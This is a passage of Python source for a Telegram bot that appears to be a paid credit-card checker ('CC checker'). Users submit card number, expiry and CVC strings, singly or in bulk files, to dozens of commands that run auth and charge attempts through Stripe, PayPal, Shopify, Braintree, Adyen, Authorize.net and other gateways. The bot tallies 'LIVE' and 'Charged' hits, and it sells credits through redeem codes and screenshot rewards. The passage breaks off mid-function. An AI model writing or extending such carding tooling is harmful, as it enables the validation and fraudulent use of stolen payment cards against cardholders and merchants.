    credit_manager.create_user(user_id, message.from_user.username, message.from_user.first_name)
    
    result = redeem_manager.redeem_code(code, user_id)
    
    if result['success']:
        new_credit = credit_manager.get_credit(user_id)
        
        log_manager.log_redeem(
            user_id, 
            message.from_user.username, 
            message.from_user.first_name,
            result['code'],
            result['plan'],
            result['credits']
        )
        
        success_logger.log_redeem(user_id, message.from_user.username, result['code'], result['plan'], result['credits'])
        
        msg = f"""
🎟️ Code Redeemed
━━━━━━━━━━━━━━━━━━━━

User ➜ {message.from_user.first_name}
Code ➜ {result['code']}
Status ➜ {result['plan']} Plan
+Credits ➜ {result['credits']}
New Balance ➜ {new_credit}

━━━━━━━━━━━━━━━━━━━━
        """
    else:
        if result['reason'] == 'invalid':
            msg = "❌ Invalid Redeem Code!\n\nPlease check the code and try again."
        else:
            msg = "❌ Code Already Used!\n\nThis code has already been redeemed."
    
    bot.reply_to(message, msg)

# ============================================================================
# ADMIN KOMUTLARI
# ============================================================================
@bot.message_handler(commands=['allahredeem'])
def cmd_allah_redeem(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Only owner can use this command!")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    for plan_key, plan in PLANS.items():
        btn = types.InlineKeyboardButton(f"{plan['name']}", callback_data=f"gen_redeem_{plan_key}_select")
        markup.add(btn)
    
    msg = """
REDEEM CODE GENERATOR
━━━━━━━━━━━━━━━━━━━━

Select a plan to generate redeem codes:

After selecting, you can specify how many codes to generate.
━━━━━━━━━━━━━━━━━━━━
    """
    
    bot.reply_to(message, msg, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('gen_redeem_'))
def handle_redeem_generation(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "Only owner can use this!", show_alert=True)
        return
    
    parts = call.data.split('_')
    plan_key = parts[2]
    action = parts[3]
    
    if action == 'select':
        markup = types.InlineKeyboardMarkup(row_width=3)
        for c in [1, 2, 3, 4, 5, 10, 15, 20, 25, 50, 100]:
            btn = types.InlineKeyboardButton(f"{c}", callback_data=f"gen_redeem_{plan_key}_{c}")
            markup.add(btn)
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_plans"))
        
        bot.edit_message_text(
            f"How many {PLANS[plan_key]['name']} codes?\n\nSelect quantity:",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup
        )
    else:
        count = int(action)
        codes = redeem_manager.generate_code(
            plan=plan_key,
            credit_amount=PLANS[plan_key]['credit'],
            created_by=ADMIN_ID,
            count=count
        )
        
        codes_text = "\n".join([f"• <code>{code}</code>" for code in codes])
        
        msg = f"""
REDEEM CODES GENERATED
━━━━━━━━━━━━━━━━━━━━

🎁 Plan: {PLANS[plan_key]['name']}
💰 Credits: {PLANS[plan_key]['credit']}
📦 Quantity: {count}

📋 Codes:

{codes_text}

━━━━━━━━━━━━━━━━━━━━
✅ Users can redeem with: /redeem [CODE]
━━━━━━━━━━━━━━━━━━━━
        """
        
        for code in codes:
            success_logger.log_redeem(ADMIN_ID, "Admin", code, plan_key, PLANS[plan_key]['credit'])
            
        log_msg = f"""
🎟️ Redeem Codes Generated

Admin: {call.from_user.first_name}
Plan: {PLANS[plan_key]['name']}
Quantity: {count}
Total Credits: {count * PLANS[plan_key]['credit']}
        """
        log_manager.send_to_channel(log_msg)
        
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, parse_mode='HTML')

# ============================================================================
# BAN KOMUTU
# ============================================================================
@bot.message_handler(commands=['ban'])
def cmd_ban(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Only owner can use this command!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /ban [user_id] [hours=0]\nExample: /ban 123456789 24 (0 = permanent)")
        return
    
    try:
        target_id = int(args[1])
        hours = int(args[2]) if len(args) > 2 else 0
        
        if credit_manager.ban_user(target_id, hours):
            duration_text = "permanently" if hours == 0 else f"for {hours} hours"
            bot.reply_to(message, f"✅ User {target_id} banned {duration_text}!")
            
            try:
                bot.send_message(target_id, f"🚫 You have been banned {duration_text} from using this bot!")
            except:
                pass
                
            log_msg = f"""
🚫 User Banned

Admin: {message.from_user.first_name}
User ID: {target_id}
Duration: {duration_text}
            """
            log_manager.send_to_channel(log_msg)
        else:
            bot.reply_to(message, "❌ Failed to ban user!")
    except:
        bot.reply_to(message, "❌ Invalid parameters!")

# ============================================================================
# UNBAN KOMUTU
# ============================================================================
@bot.message_handler(commands=['unban'])
def cmd_unban(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Only owner can use this command!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /unban [user_id]\nExample: /unban 123456789")
        return
    
    try:
        target_id = int(args[1])
        
        if credit_manager.unban_user(target_id):
            bot.reply_to(message, f"✅ User {target_id} unbanned!")
            
            try:
                bot.send_message(target_id, f"✅ You have been unbanned! You can now use the bot again.")
            except:
                pass
                
            log_msg = f"""
✅ User Unbanned

Admin: {message.from_user.first_name}
User ID: {target_id}
            """
            log_manager.send_to_channel(log_msg)
        else:
            bot.reply_to(message, "❌ Failed to unban user!")
    except:
        bot.reply_to(message, "❌ Invalid parameters!")

# ============================================================================
# TOTALMEMBERS KOMUTU
# ============================================================================
@bot.message_handler(commands=['totalmembers'])
def cmd_totalmembers(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Only owner can use this command!")
        return
    
    stats = credit_manager.get_total_stats()
    
    msg = f"""
📊 BOT STATISTICS
━━━━━━━━━━━━━━━━━━━━

👥 Total Users: {stats['total_users']}
👑 Premium Users: {stats['total_premium']}
👥 Free Users: {stats['total_users'] - stats['total_premium']}

📈 TOTAL HITS: {stats['total_hits']}
✅ Approved: {stats['total_approved']}
💎 Charged: {stats['total_charged']}
❌ Declined: {stats['total_hits'] - stats['total_approved'] - stats['total_charged']}

💰 Total Credits: {stats['total_credits']}

━━━━━━━━━━━━━━━━━━━━
Last Updated: {dt.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━
    """
    
    bot.reply_to(message, msg)
    
    log_manager.send_to_channel(f"📊 Statistics requested by admin\n{msg}")

# ============================================================================
# HIT KOMUTU
# ============================================================================
@bot.message_handler(commands=['hit'])
def cmd_hit(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    msg = bot.reply_to(message, "📸 Please send your hit screenshot. Admin will review and add 20 credits if approved.")
    bot.register_next_step_handler(msg, process_hit_screenshot)

def process_hit_screenshot(message):
    if not message.photo:
        bot.reply_to(message, "❌ Please send a photo!")
        return
    
    user_id = message.from_user.id
    photo = message.photo[-1]
    file_id = photo.file_id
    caption = message.caption or "No caption"
    
    admin_markup = types.InlineKeyboardMarkup(row_width=2)
    approve_btn = types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_hit_{user_id}")
    reject_btn = types.InlineKeyboardButton("❌ Reject", callback_data=f"reject_hit_{user_id}")
    admin_markup.add(approve_btn, reject_btn)
    
    admin_msg = f"""
📸 New Hit Approval Request
━━━━━━━━━━━━━━━━━━━━
User: {message.from_user.first_name} (ID: {user_id})
Caption: {caption}
━━━━━━━━━━━━━━━━━━━━
    """
    
    sent_msg = bot.send_photo(ADMIN_ID, file_id, caption=admin_msg, reply_markup=admin_markup)
    
    # Note: save_hit_approval method is not defined in CreditManager, but we'll keep for compatibility
    # credit_manager.save_hit_approval(user_id, sent_msg.message_id, file_id, caption)
    
    bot.reply_to(message, "✅ Your hit screenshot has been sent to admin for review. You will receive 20 credits if approved.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_hit_') or call.data.startswith('reject_hit_'))
def handle_hit_approval(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "Only admin can do this!", show_alert=True)
        return
    
    action, user_id = call.data.split('_')[0], int(call.data.split('_')[2])
    
    if action == 'approve':
        credit_manager.add_credit(user_id, 20, None)
        bot.answer_callback_query(call.id, "✅ Approved! 20 credits added.")
        
        try:
            bot.send_message(user_id, "✅ Your hit has been approved! 20 credits added to your account.")
        except:
            pass
            
        log_msg = f"""
✅ Hit Approved

Admin: {call.from_user.first_name}
User ID: {user_id}
Credits: +20
        """
        log_manager.send_to_channel(log_msg)
        
        bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=call.message.caption + "\n\n✅ APPROVED - 20 credits added"
        )
    else:
        bot.answer_callback_query(call.id, "❌ Rejected.")
        
        try:
            bot.send_message(user_id, "❌ Your hit has been rejected. Please send a valid screenshot.")
        except:
            pass
        
        bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=call.message.caption + "\n\n❌ REJECTED"
        )

# ============================================================================
# USERINFO KOMUTU (ADMIN)
# ============================================================================
@bot.message_handler(commands=['userinfo'])
def cmd_userinfo(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ This command is only for admin!")
        return
    
    args = message.text.split()
    
    if message.reply_to_message:
        target_id = message.reply_to_message.from_user.id
        target_name = message.reply_to_message.from_user.first_name
        target_username = message.reply_to_message.from_user.username
    elif len(args) > 1:
        try:
            target_id = int(args[1])
            target_name = "User"
            target_username = None
        except:
            bot.reply_to(message, "❌ Invalid user ID!")
            return
    else:
        bot.reply_to(message, "Usage: /userinfo [user_id] or reply to a user message")
        return
    
    user_info = credit_manager.get_user_info(target_id)
    
    if not user_info:
        credit_manager.create_user(target_id, target_username, target_name)
        user_info = credit_manager.get_user_info(target_id)
    
    if user_info:
        plan_emoji = "👑" if user_info['plan'] != 'Free' else "🆓"
        
        total_checks = user_info['total_checks']
        approved = user_info['approved_count']
        charged = user_info['charged_count']
        declined = total_checks - approved - charged
        
        msg = f"""
👤 USER INFORMATION
━━━━━━━━━━━━━━━━━━━━
🆔 ID: `{target_id}`
👤 Name: {user_info['first_name']}
📛 Username: @{user_info['username'] if user_info['username'] else 'None'}
📊 Plan: {plan_emoji} {user_info['plan']}
💰 Credits: {user_info['credit']}
📅 Registered: {user_info['register_date']}

📈 STATISTICS
━━━━━━━━━━━━━━━━━━━━
🔍 Total Checks: {total_checks}
✅ Approved/LIVE: {approved}
💎 Charged: {charged}
❌ Declined: {declined}

🚫 BAN STATUS
━━━━━━━━━━━━━━━━━━━━
🚫 Banned: {'Yes' if user_info['banned'] else 'No'}
⏱️ Ban Until: {user_info['ban_until'] if user_info['ban_until'] else 'None'}
━━━━━━━━━━━━━━━━━━━━
        """
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        if user_info['banned']:
            btn1 = types.InlineKeyboardButton("✅ Unban", callback_data=f"admin_unban_{target_id}")
        else:
            btn1 = types.InlineKeyboardButton("🚫 Ban 24h", callback_data=f"admin_ban_24_{target_id}")
            btn2 = types.InlineKeyboardButton("🚫 Ban Permanent", callback_data=f"admin_ban_perm_{target_id}")
            markup.add(btn1, btn2)
        
        btn3 = types.InlineKeyboardButton("💰 +100 Credits", callback_data=f"admin_add_100_{target_id}")
        btn4 = types.InlineKeyboardButton("💰 +500 Credits", callback_data=f"admin_add_500_{target_id}")
        markup.add(btn3, btn4)
        
        bot.reply_to(message, msg, parse_mode='Markdown', reply_markup=markup)
    else:
        bot.reply_to(message, "❌ User not found!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback_handler(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ You are not authorized!", show_alert=True)
        return
    
    parts = call.data.split('_')
    action = parts[1]
    
    if action == 'unban':
        target_id = int(parts[2])
        credit_manager.unban_user(target_id)
        bot.answer_callback_query(call.id, "✅ User unbanned!", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        
    elif action == 'ban':
        duration = parts[2]
        target_id = int(parts[3])
        
        if duration == '24':
            credit_manager.ban_user(target_id, 24)
            bot.answer_callback_query(call.id, "✅ User banned for 24 hours!", show_alert=True)
        elif duration == 'perm':
            credit_manager.ban_user(target_id, 0)
            bot.answer_callback_query(call.id, "✅ User banned permanently!", show_alert=True)
        
        bot.delete_message(call.message.chat.id, call.message.message_id)
        
    elif action == 'add':
        amount = parts[2]
        target_id = int(parts[3])
        
        credit_manager.add_credit(target_id, int(amount))
        bot.answer_callback_query(call.id, f"✅ +{amount} credits added!", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)

# ============================================================================
# DELUXE GATEWAY KOMUTLARI (dinamik oluşturma)
# ============================================================================
def create_deluxe_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        args = message.text.split()
        if len(args) < 2:
            cmd_name = f"/d{amount}" if amount >= 1 else f"/d{str(amount).replace('.', '_')}"
            bot.reply_to(message, f"Usage: {cmd_name} card|month|year|cvc")
            return
        
        card = args[1]
        credit_cost = CREDIT_COSTS['charge_low'] if amount <= 50 else CREDIT_COSTS['charge_high']
        gateway_name = f"Deluxe {amount}$ Charge"
        
        animated_check(message, card, gateway_name, deluxe_charge, credit_cost, amount)
    return handler

for amount in [0.25, 0.50, 0.75]:
    cmd_name = f'd{str(amount).replace(".", "_")}'
    bot.message_handler(commands=[cmd_name])(create_deluxe_handler(amount))
for amount in range(1, 101):
    bot.message_handler(commands=[f'd{amount}'])(create_deluxe_handler(amount))

def create_deluxe_txt_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        if amount in [0.25, 0.50, 0.75]:
            cmd_name = f"/d{str(amount).replace('.', '_')}txt"
            display_amount = f"${amount}"
        else:
            cmd_name = f"/d{amount}txt"
            display_amount = f"${amount}"
        
        process_txt_command(message, cmd_name, f'Deluxe {display_amount} Charge (TXT)', deluxe_charge, amount)
    return handler

for amount in [0.25, 0.50, 0.75]:
    cmd_name = f'd{str(amount).replace(".", "_")}txt'
    bot.message_handler(commands=[cmd_name])(create_deluxe_txt_handler(amount))
for amount in range(1, 101):
    bot.message_handler(commands=[f'd{amount}txt'])(create_deluxe_txt_handler(amount))

# ============================================================================
# CUSTOM STRIPE KOMUTLARI
# ============================================================================
def create_custom_stripe_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, f"Usage: /cstripe{amount} card|month|year|cvc")
            return
        
        card = args[1]
        credit_cost = CREDIT_COSTS['charge_low'] if amount <= 50 else CREDIT_COSTS['charge_high']
        gateway_name = f"Stripe {amount}$ Charge"
        
        animated_check(message, card, gateway_name, custom_stripe_charge, credit_cost, amount)
    return handler

for amount in range(1, 101):
    bot.message_handler(commands=[f'cstripe{amount}'])(create_custom_stripe_handler(amount))

def create_custom_stripe_txt_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        cmd_name = f"/cstripe{amount}txt"
        gateway_name = f"Stripe {amount}$ Charge (TXT)"
        process_txt_command(message, cmd_name, gateway_name, custom_stripe_charge, amount)
    return handler

for amount in range(1, 101):
    bot.message_handler(commands=[f'cstripe{amount}txt'])(create_custom_stripe_txt_handler(amount))

# ============================================================================
# CUSTOM PAYPAL KOMUTLARI
# ============================================================================
def create_custom_paypal_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, f"Usage: /cpaypal{amount} card|month|year|cvc")
            return
        
        card = args[1]
        credit_cost = CREDIT_COSTS['charge_low'] if amount <= 50 else CREDIT_COSTS['charge_high']
        gateway_name = f"PayPal {amount}$ Charge"
        
        animated_check(message, card, gateway_name, custom_paypal_charge, credit_cost, amount)
    return handler

for amount in range(1, 101):
    bot.message_handler(commands=[f'cpaypal{amount}'])(create_custom_paypal_handler(amount))

def create_custom_paypal_txt_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        cmd_name = f"/cpaypal{amount}txt"
        gateway_name = f"PayPal {amount}$ Charge (TXT)"
        process_txt_command(message, cmd_name, gateway_name, custom_paypal_charge, amount)
    return handler

for amount in range(1, 101):
    bot.message_handler(commands=[f'cpaypal{amount}txt'])(create_custom_paypal_txt_handler(amount))

# ============================================================================
# CUSTOM SHOPIFY KOMUTLARI
# ============================================================================
def create_custom_shopify_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, f"Usage: /cshopify{amount} card|month|year|cvc")
            return
        
        card = args[1]
        credit_cost = CREDIT_COSTS['charge_low'] if amount <= 50 else CREDIT_COSTS['charge_high']
        gateway_name = f"Shopify {amount}$ Charge"
        
        animated_check(message, card, gateway_name, custom_shopify_charge, credit_cost, amount)
    return handler

for amount in range(1, 101):
    bot.message_handler(commands=[f'cshopify{amount}'])(create_custom_shopify_handler(amount))

def create_custom_shopify_txt_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        cmd_name = f"/cshopify{amount}txt"
        gateway_name = f"Shopify {amount}$ Charge (TXT)"
        process_txt_command(message, cmd_name, gateway_name, custom_shopify_charge, amount)
    return handler

for amount in range(1, 101):
    bot.message_handler(commands=[f'cshopify{amount}txt'])(create_custom_shopify_txt_handler(amount))

# ============================================================================
# CUSTOM BRAINTREE KOMUTLARI
# ============================================================================
def create_custom_braintree_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, f"Usage: /cbraintree{amount} card|month|year|cvc")
            return
        
        card = args[1]
        credit_cost = CREDIT_COSTS['charge_low'] if amount <= 50 else CREDIT_COSTS['charge_high']
        gateway_name = f"Braintree {amount}$ Charge"
        
        animated_check(message, card, gateway_name, custom_braintree_charge, credit_cost, amount)
    return handler

for amount in range(1, 101):
    bot.message_handler(commands=[f'cbraintree{amount}'])(create_custom_braintree_handler(amount))

def create_custom_braintree_txt_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        cmd_name = f"/cbraintree{amount}txt"
        gateway_name = f"Braintree {amount}$ Charge (TXT)"
        process_txt_command(message, cmd_name, gateway_name, custom_braintree_charge, amount)
    return handler

for amount in range(1, 101):
    bot.message_handler(commands=[f'cbraintree{amount}txt'])(create_custom_braintree_txt_handler(amount))

# ============================================================================
# CUSTOM AUTHORIZE KOMUTLARI
# ============================================================================
def create_custom_authorize_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, f"Usage: /cauthorize{amount} card|month|year|cvc")
            return
        
        card = args[1]
        credit_cost = CREDIT_COSTS['charge_low'] if amount <= 50 else CREDIT_COSTS['charge_high']
        gateway_name = f"Authorize.net {amount}$ Charge"
        
        animated_check(message, card, gateway_name, custom_authorize_charge, credit_cost, amount)
    return handler

for amount in range(1, 101):
    bot.message_handler(commands=[f'cauthorize{amount}'])(create_custom_authorize_handler(amount))

def create_custom_authorize_txt_handler(amount):
    def handler(message):
        if not check_membership(message.from_user.id):
            bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
            return
        
        user_id = message.from_user.id
        if credit_manager.is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using this bot!")
            return
        
        cmd_name = f"/cauthorize{amount}txt"
        gateway_name = f"Authorize.net {amount}$ Charge (TXT)"
        process_txt_command(message, cmd_name, gateway_name, custom_authorize_charge, amount)
    return handler

for amount in range(1, 101):
    bot.message_handler(commands=[f'cauthorize{amount}txt'])(create_custom_authorize_txt_handler(amount))

# ============================================================================
# AUTH KOMUTLARI
# ============================================================================
@bot.message_handler(commands=['vbv'])
def cmd_vbv(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /vbv card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "3D Lookup (Stripe)", vbv_check, CREDIT_COSTS['vbv'])

@bot.message_handler(commands=['st'])
def cmd_st(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /st card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "Stripe Auth", stripe_auth_original, CREDIT_COSTS['stripe_auth'])

@bot.message_handler(commands=['ad'])
def cmd_ad(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /ad card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "Adyen Auth", adyen_auth, CREDIT_COSTS['adyen_auth'])

@bot.message_handler(commands=['adyenvbv'])
def cmd_adyenvbv(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /adyenvbv card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "Adyen 3D Check", adyen_vbv, CREDIT_COSTS['adyen_auth'])

@bot.message_handler(commands=['b1'])
def cmd_b1(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /b1 card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "Braintree Auth", braintree_auth, CREDIT_COSTS['adyen_auth'])

@bot.message_handler(commands=['sh'])
def cmd_sh(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /sh card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "Shopify Auth", shopify_auth, CREDIT_COSTS['adyen_auth'])

@bot.message_handler(commands=['pp'])
def cmd_pp(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /pp card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "PayPal Auth", paypal_auth, CREDIT_COSTS['adyen_auth'])

@bot.message_handler(commands=['a1'])
def cmd_a1(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /a1 card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "Gallery Auth", stripe_auth_gallery, CREDIT_COSTS['stripe_auth'])

@bot.message_handler(commands=['a2'])
def cmd_a2(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /a2 card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "Redblue Auth", stripe_auth_redblue, CREDIT_COSTS['stripe_auth'])

@bot.message_handler(commands=['pfa'])
def cmd_pfa(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /pfa card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "Payflow Auth", payflow_auth, CREDIT_COSTS['payflow'])

# ============================================================================
# OTHER GATES KOMUTLARI
# ============================================================================
@bot.message_handler(commands=['boc'])
def cmd_boc(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /boc card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "Battery Candle Payflow", payflow_boc_charge, CREDIT_COSTS['payflow'])

@bot.message_handler(commands=['rs'])
def cmd_rs(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /rs card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "RS Online Worldpay", rs_online_charge, CREDIT_COSTS['charge_low'])

@bot.message_handler(commands=['authnet'])
def cmd_authnet(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /authnet card|month|year|cvc")
        return
    
    card = args[1]
    animated_check(message, card, "Authorize.net 1$ Charge", lambda c: authorize_charge(c, 1.00), CREDIT_COSTS['charge_low'])

# ============================================================================
# AUTO KOMUTLARI
# ============================================================================
@bot.message_handler(commands=['kill'])
def cmd_kill(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /kill card|month|year|cvc")
        return
    
    card = args[1]
